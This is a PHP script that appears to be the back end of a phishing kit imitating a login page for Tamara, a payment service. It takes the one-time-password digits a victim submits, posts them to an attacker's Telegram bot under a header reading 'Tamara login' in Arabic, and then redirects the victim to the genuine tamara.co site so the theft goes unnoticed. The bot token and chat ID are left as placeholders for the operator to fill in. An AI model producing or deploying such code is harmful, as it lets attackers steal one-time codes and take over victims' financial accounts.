<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  
    $telegram_bot_token = 'توكننننننننننننننننننننننن';
    $chat_id = 'ايديييي جات';


    $message = "--++-----[ تسجيل دخول تمارا ]-----++--\n\n";
    $message .= "OTP: " . implode('', $_POST['otp']) . "\n";


   
    $url = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";
    $data = array('chat_id' => $chat_id, 'text' => $message);
    $options = array(
        'http' => array(
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ),
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);


    if ($result === FALSE) {

        http_response_code(500);
        echo json_encode(array('message' => 'Error sending message to Telegram'));
        exit;
    }

    header("Location: https://tamara.co/ar-SA");
    exit;
}
?>
